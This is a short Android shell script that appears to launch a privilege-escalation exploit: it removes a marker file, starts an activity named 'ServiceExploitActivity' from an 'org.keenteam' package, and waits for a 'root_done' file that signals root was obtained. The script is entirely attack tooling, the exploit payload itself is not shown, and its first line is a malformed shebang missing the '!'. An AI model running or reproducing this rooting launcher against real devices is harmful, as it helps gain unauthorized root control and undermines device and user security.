#/system/bin/sh

rm -f /data/local/tmp/root_done
am start -n org.keenteam/org.keenteam.ServiceExploitActivity
while [ ! -f /data/local/tmp/root_done ]; do sleep 1; done
